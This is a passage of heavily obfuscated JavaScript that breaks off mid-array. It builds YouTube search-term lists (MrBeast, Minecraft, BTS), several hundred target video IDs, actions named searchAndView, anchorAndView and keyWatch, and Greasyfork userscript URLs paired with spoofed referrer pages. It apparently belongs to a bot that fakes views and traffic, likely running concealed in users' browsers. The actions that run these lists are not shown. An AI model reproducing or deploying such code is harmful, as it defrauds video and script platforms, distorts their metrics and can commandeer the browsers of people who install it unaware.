searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + Z(0x13))['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x4f7 * 0x4 + 0x1 * 0x2605 + 0x121f * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1df4 + 0x6 * 0xca + 0x1942)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xc55 + -0x8da + -0xa99 * -0x2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    Z(0x16) + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    Z(0x14) + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    Z(0x1c) + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    Z(0xf) + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    Z(0x3) + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    Z(0xc) + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    Z(0x1a) + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + Z(0x5) + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': a0(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
